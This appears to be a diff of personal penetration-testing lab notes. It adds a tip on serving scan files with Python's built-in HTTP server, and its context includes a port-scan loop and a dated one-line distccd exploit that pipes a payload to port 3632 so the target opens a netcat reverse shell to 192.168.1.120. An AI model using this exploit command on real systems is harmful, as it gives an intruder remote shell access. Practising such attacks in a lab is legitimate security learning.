@@ -67,6 +67,18 @@ ports="9001-10000"; for ip in 10.30.0.1 10.30.0.109 10.30.0.235 10.30.0.236 10.3
 
 
 
+
+A Faster alternative for the future: Python HTTP Server
+If you ever get tired of uploading to GitHub just to download it on the same physical computer, here is an industry-standard shortcut you can run directly inside your Kali terminal.
+
+In your Kali terminal, navigate to the directory where your scan files are saved and run this:
+
+Bash
+
+
+python3 -m http.server 8080
+This instantly turns your Kali machine into a temporary web server. Now, you can just open Edge on your host computer, type in your Kali machine's IP address followed by the port (e.g., http://192.168.1.x:8080), and you will see a list of all your scan files ready to click and download instantly—no internet upload required!
+
 20/05/2026:
 printf "DIST00000001ARGC00000008ARGV00000002shARGV00000002-cARGV00000031nc -e /bin/bash 192.168.1.120 4444ARGD00000001X" | nc -nv 10.30.0.235 3632
 
